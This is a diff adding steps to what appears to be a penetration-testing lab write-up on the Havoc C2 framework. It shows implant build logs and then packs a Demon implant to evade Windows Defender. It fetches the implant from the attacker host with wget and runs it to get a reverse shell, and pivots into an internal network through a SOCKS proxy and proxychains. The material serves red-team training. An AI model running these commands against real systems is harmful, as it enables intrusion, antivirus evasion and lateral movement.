@@ -234,3 +234,185 @@ Building Console
 
 Payload saved under: /home/jeff/Documents/Tools/HavocC2/Havocdemon.exe
 
+
+In the Havoc Teamserver logs
+-----------------------------
+[00:57:04] [DBUG] [builder.(*Builder).Build:261]: Compile exe
+[00:59:37] [DBUG] [teamserver.(*Teamserver).EventAppend:687]: Onetime package. not gonna save:  {{5 Jeff 16/01/2023 00:59:37 true} {2 map[AgentType:Demon Arch:x64 Config:{
+    "Indirect Syscall": true,
+    "Injection": {
+        "Alloc": "Native/Syscall",
+        "Execute": "Native/Syscall",
+        "Spawn32": "C:\\Windows\\SysWOW64\\notepad.exe",
+        "Spawn64": "C:\\Windows\\System32\\notepad.exe"
+    },
+    "Sleep": "2",
+    "Sleep Technique": "Ekko"
+}
+ Format:Windows Exe Listener:Test]}}
+[00:59:37] [DBUG] [builder.(*Builder).DebugMode:139]: Payload Builder: Enable Debug Mode false
+[00:59:37] [DBUG] [teamserver.(*Teamserver).DispatchEvent.func3:761]: Windows Exe
+[00:59:37] [DBUG] [builder.(*Builder).PatchConfig:414]: map[Indirect Syscall:true Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Sleep:2 Sleep Technique:Ekko]
+[00:59:37] [DBUG] [builder.(*Builder).PatchConfig:586]: Host => 192.168.56.104
+[00:59:37] [DBUG] [builder.(*Builder).PatchConfig:616]: host only
+[00:59:37] [DBUG] [builder.(*Builder).PatchConfig:685]: DemonConfig:
+00000000  02 00 00 00 02 00 00 00  02 00 00 00 1f 00 00 00  |................|
+00000010  43 3a 5c 57 69 6e 64 6f  77 73 5c 53 79 73 74 65  |C:\Windows\Syste|
+00000020  6d 33 32 5c 6e 6f 74 65  70 61 64 2e 65 78 65 1f  |m32\notepad.exe.|
+00000030  00 00 00 43 3a 5c 57 69  6e 64 6f 77 73 5c 53 79  |...C:\Windows\Sy|
+00000040  73 57 4f 57 36 34 5c 6e  6f 74 65 70 61 64 2e 65  |sWOW64\notepad.e|
+00000050  78 65 02 00 00 00 00 00  00 00 01 00 00 00 1c 00  |xe..............|
+00000060  00 00 31 00 39 00 32 00  2e 00 31 00 36 00 38 00  |..1.9.2...1.6.8.|
+00000070  2e 00 35 00 36 00 2e 00  31 00 30 00 34 00 bb 01  |..5.6...1.0.4...|
+<SNIP>
+[00:59:37] [DBUG] [builder.(*Builder).Build:171]: len(Config) =  412
+[00:59:37] [DBUG] [builder.(*Builder).Build:181]: array = {0x02\,0x00\,0x00\,0x00\,0x02\,0x00\,0x00\,0x00\,0x02\,<SNIP>
+[00:59:37] [DBUG] [builder.(*Builder).Build:261]: Compile exe
+
+
+====================================================================================================================================================
+PoC - Step 5 - Generate a packed version of the HAVOC implant and run it on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
+====================================================================================================================================================
+
+PS C:\Users\Administrator\Downloads> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 15/01/2023 13:05:26
+
+PS C:\Users\Administrator\Downloads> wget -URI http://192.168.56.104:8080/PackedHavocRevShell.exe -OutFile PackedHavocRevShell.exe
+
+PS C:\Users\Administrator\Downloads> .\PackedHavocRevShell.exe
+
+Notes
+-----
+> Multiple tools can be used to "pack/obfuscate/encrypt" the HAVOC implants (e.g. https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)) 
+
+
+==============================================================================================================================================
+PoC - Step 6 - Get the reverse shell and then configure a SOCKS proxy 4 within the HAVOC session (command "socks add")
+==============================================================================================================================================
+
+=> Once the HAVOC implant connects back to the HAVOC temaserver you can interact with the reverse shell by cliking on "Interact"  
+
+[16/01/2023 02:01:29] Agent 4CCD1C1E authenticated from as Laptop1\Administrator :: [Internal: 0.0.0.0] [Process: PackedHavocRevShell.exe\7344] [Arch: x64] [Pivot: Direct]
+
+16/01/2023 02:03:31 [Jeff] Demon >> help
+
+Demon Commands
+==============
+
+  Command            Type         Description
+  -------            -------      -----------
+  help               Command      Shows help message of specified command
+  sleep              Command      sets the delay to sleep
+  checkin            Command      request a checkin request
+  job                Module       job manager
+  task               Module       task manager
+  proc               Module       process enumeration and management
+  transfer           Command      download transfer module
+  dir                Command      list specified directory
+  download           Command      downloads a specified file
+  upload             Command      uploads a specified file
+  cd                 Command      change to specified directory
+  cp                 Command      copy file from one location to another
+  remove             Command      remove file or directory
+  mkdir              Command      create new directory
+  pwd                Command      get current directory
+  cat                Command      display content of the specified file
+  screenshot         Command      takes a screenshot
+  shell              Command      executes cmd.exe commands and gets the output
+  powershell         Command      executes powershell.exe commands and gets the output
+  inline-execute     Command      executes an object file
+  shellcode          Module       shellcode injection techniques
+  dll                Module       dll spawn and injection modules
+  exit               Command      cleanup and exit
+  token              Module       token manipulation and impersonation
+  dotnet             Module       execute and manage dotnet assemblies
+  net                Module       network and host enumeration module
+  config             Module       configure the behaviour of the demon session
+  pivot              Module       pivoting module
+  rportfwd           Module       reverse port forwarding
+  socks              Module       socks4a proxy
+
+
+  16/01/2023 02:06:23 [Jeff] Demon >> help socks
+
+ - Command       :  socks
+ - Description   :  socks4a proxy
+ - Usage         :  socks [sub command] (args)
+ - Example       :  socks add 4444
+
+  Command                        Description      
+  ---------                      -------------     
+  add                            add a socks4a proxy
+  list                           list all socks4a proxy servers
+  kill                           kill and remove a socks4a proxy server
+  clear                          kill and clear all socks4a proxy servers
+
+
+16/01/2023 02:07:45 [Jeff] Demon >> socks add
+[!] Not enough arguments for "socks add"
+
+16/01/2023 02:07:50 [Jeff] Demon >> socks add 4444
+[+] Started socks4a server on port 4444
+
+
+------------------------------------------------------------------
+Notes
+# apt-get install proxychains
+# cp /etc/proxychains.conf /etc/proxychains.conf.backup
+# echo "socks5 127.0.0.1 1081" >> /etc/proxychains.conf
+------------------------------------------------------------------
+Configuration of Proxychains
+------------------------------------------------------------------
+
+jeff@kali:~$ tail /etc/proxychains.conf
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4  127.0.0.1 9050
+# socks5  127.0.0.1 1080
+socks4  127.0.0.1 4444
+
+
+===================================================================================================================================================
+PoC - Step 7 - Use Proxychains on the Kali Linux server (192.168.56.104) and the HAVOC session (socks4) to pivot into the network '192.168.1.0/24' 
+===================================================================================================================================================
+
+without using Proxychains and the HAVOC session, the network traffic is filtered towards the Windows machine '192.168.1.113' from the Kali VM 
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ nmap -sT -Pn -p 3389 192.168.1.113
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-01-16 02:50 CET
+Nmap scan report for 192.168.1.113
+Host is up (0.000026s latency).
+
+PORT     STATE    SERVICE
+3389/tcp filtered ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds
+
+
+Example 1 - Nmap port scan of the Windows machine '192.168.1.113' (from the KALI VM) over the SLIVER session
+----------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ proxychains nmap -sT -Pn -p 3389 192.168.1.113
+ProxyChains-3.1 (http://proxychains.sf.net)
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-01-16 02:50 CET
+|S-chain|-<>-127.0.0.1:4444-<><>-192.168.1.113:3389-<><>-OK
+Nmap scan report for 192.168.1.113
+Host is up (0.13s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 13.20 seconds
